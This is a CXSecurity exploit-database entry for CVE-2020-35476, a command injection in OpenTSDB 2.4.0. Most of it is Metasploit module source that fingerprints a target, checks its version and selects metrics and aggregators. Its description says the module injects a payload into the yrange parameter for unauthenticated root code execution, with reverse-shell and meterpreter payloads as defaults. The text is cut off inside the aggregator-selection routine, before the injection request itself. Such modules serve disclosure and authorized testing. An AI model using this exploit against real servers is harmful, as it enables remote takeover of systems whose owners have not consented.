---
title: OpenTSDB 2.4.0 Command Injection
url: https://cxsecurity.com/issue/WLB-2022120044
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-25
fetch_date: 2025-10-04T02:28:29.574364
---

# OpenTSDB 2.4.0 Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OpenTSDB 2.4.0 Command Injection** **2022.12.24**  Credit:  **[Shai rod](https://cxsecurity.com/author/Shai%2Brod/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2020-35476](https://cxsecurity.com/cveshow/CVE-2020-35476/ "Click to see CVE-2020-35476")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")**  CVSS Base Score: **7.5/10**  Impact Subscore: **6.4/10**  Exploitability Subscore: **10/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Partial**  Integrity impact: **Partial**  Availability impact: **Partial** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'OpenTSDB 2.4.0 unauthenticated command injection',
'Description' => %q{
This module exploits an unauthenticated command injection
vulnerability in the yrange parameter in OpenTSDB through
2.4.0 (CVE-2020-35476) in order to achieve unauthenticated
remote code execution as the root user.
The module first attempts to obtain the OpenTSDB version via
the api. If the version is 2.4.0 or lower, the module
performs additional checks to obtain the configured metrics
and aggregators. It then randomly selects one metric and one
aggregator and uses those to instruct the target server to
plot a graph. As part of this request, the yrange parameter is
set to the payload, which will then be executed by the target
if the latter is vulnerable.
This module has been successfully tested against OpenTSDB
version 2.3.0.
},
'License' => MSF\_LICENSE,
'Author' => [
'Shai rod', # @nightrang3r - discovery and PoC
'Erik Wynter' # @wyntererik - Metasploit
],
'References' => [
['CVE', '2020-35476'],
['URL', 'https://github.com/OpenTSDB/opentsdb/issues/2051'] # disclosure and PoC
],
'DefaultOptions' => {
'RPORT' => 4242
},
'Platform' => %w[unix linux],
'Arch' => [ARCH\_CMD, ARCH\_X86, ARCH\_X64],
'CmdStagerFlavor' => %w[bourne curl wget],
'Targets' => [
[
'Automatic (Unix In-Memory)',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' },
'Type' => :unix\_memory
}
],
[
'Automatic (Linux Dropper)',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X86, ARCH\_X64],
'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse\_tcp' },
'Type' => :linux\_dropper
}
]
],
'Privileged' => true,
'DisclosureDate' => '2020-11-18',
'DefaultTarget' => 1,
'Notes' => {
'Stability' => [ CRASH\_SAFE ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS ],
'Reliability' => [ REPEATABLE\_SESSION ]
}
)
)
register\_options [
OptString.new('TARGETURI', [true, 'The base path to OpenTSDB', '/']),
]
end
def check
# sanity check to see if the target is likely OpenTSDB
res1 = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path)
})
unless res1
return CheckCode::Unknown('Connection failed.')
end
unless res1.code == 200 && res1.get\_html\_document.xpath('//title').text.include?('OpenTSDB')
return CheckCode::Safe('Target is not an OpenTSDB application.')
end
# get the version via the api
res2 = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'api', 'version')
})
unless res2
return CheckCode::Unknown('Connection failed.')
end
unless res2.code == 200 && res2.body.include?('version')
return CheckCode::Detected('Target may be OpenTSDB but the version could not be determined.')
end
begin
parsed\_res\_body = JSON.parse(res2.body)
rescue JSON::ParserError
return CheckCode::Detected('Could not determine the OpenTSDB version: the HTTP response body did not match the expected JSON format.')
end
unless parsed\_res\_body.is\_a?(Hash) && parsed\_res\_body.key?('version')
return CheckCode::Detected('Could not determine the OpenTSDB version: the HTTP response body did not match the expected JSON format.')
end
version = parsed\_res\_body['version']
begin
if Rex::Version.new(version) <= Rex::Version.new('2.4.0')
return CheckCode::Appears("The target is OpenTSDB version #{version}")
else
return CheckCode::Safe("The target is OpenTSDB version #{version}")
end
rescue ArgumentError => e
return CheckCode::Unknown("Failed to obtain a valid OpenTSDB version: #{e}")
end
end
def select\_metric
# check if any metrics have been configured. if not, exploitation cannot work
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'suggest'),
'vars\_get' => { 'type' => 'metrics' }
})
unless res
fail\_with(Failure::Unknown, 'Connection failed.')
end
unless res.code == 200
fail\_with(Failure::UnexpectedReply, "Received unexpected status code #{res.code} when checking the configured metrics")
end
begin
metrics = JSON.parse(res.body)
rescue JSON::ParserError
fail\_with(Failure::UnexpectedReply, 'Received unexpected reply when checking the configured metrics: The response body did not contain valid JSON.')
end
unless metrics.is\_a?(Array)
fail\_with(Failure::UnexpectedReply, 'Received unexpected reply when checking the configured metrics: The response body did not contain a JSON array')
end
if metrics.empty?
fail\_with(Failure::NoTarget, 'Failed to identify any configured metrics. This makes exploitation impossible')
end
# select a random metric since any will do
@metric = metrics.sample
print\_status("Identified #{metrics.length} configured metrics. Using metric #{@metric}")
end
def select\_aggregator
# check the configured aggregators and select one at random
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'aggregators')
})
unless res
fail\_with(Failure::Unknown, 'Connection failed.')
end
unless res.code == 200
fail\_with(Failure::UnexpectedReply, "Received unexpected status code #{res.code} when checking the configured aggregators")
end
begin
aggregators = JSON.parse(res.body)
rescue JSON...